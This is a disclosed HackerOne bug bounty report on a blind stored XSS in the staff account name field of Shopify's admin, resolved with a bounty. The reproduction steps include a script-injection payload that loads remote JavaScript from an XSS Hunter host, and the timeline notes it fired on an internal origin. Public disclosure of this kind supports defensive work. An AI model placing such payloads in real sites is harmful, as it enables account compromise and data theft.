---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/cross-site-scripting-xss-stored
  - env/web
substate: "resolved"
weakness: "Cross-site Scripting (XSS) - Stored"
enriched: true
body: true
date: 2020-08-18
submitted: 2020-07-31T23:06:18.152Z
bounty_usd: 3000
votes: 45
cve: []
program: "[[programs/shopify|Shopify]]"
reporter: "rioncool22"
source: "https://hackerone.com/reports/948929"
title: "Blind Stored XSS Via Staff Name"
---
# Blind Stored XSS Via Staff Name

> **Severity:** High | **Bounty:** 3,000 USD | **Votes:** 45 | **Program:** Shopify | **Disclosed:** 2020-08-18

- Report: [https://hackerone.com/reports/948929](https://hackerone.com/reports/948929)
- CWE: Cross-site Scripting (XSS) - Stored
- Submitted: 2020-07-31T23:06:18.152Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

Hey Team, I found blind stored XSS when i add staff name  in https://your-store.myshopify.com/admin/settings/account

Step to reproduce : 
1. Go to https://your-store.myshopify.com/admin/settings/account
2. Add Staff Account 
3. Fill First & Last Name with this payload "><script>$.getScript("//█████████.xss.ht")</script>
4. XSS will be fired in your internal web

You should check the DOM.html guys

## Impact

Stored XSS

## Timeline

- **Report Filed**
- **2020-08-01** @rioncool22: I also add XSS Hunter Payload in my account name
- **2020-08-04** @rioncool22: Just now, the XSS fired in http://localhost:4567 origin
- **2020-08-04** @jack_mccracken: Hi @rioncool22,

Thanks for the report and the extra context. We're still investigating your report and will get back to you soon.
- **Report Triaged**
- **2020-08-04** @rioncool22: Thanks for triaging @zack_spotify :D
- **Bounty Awarded**
- **Report Resolved**
- **2020-08-06** @rioncool22: Thanks for the bounty guys
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
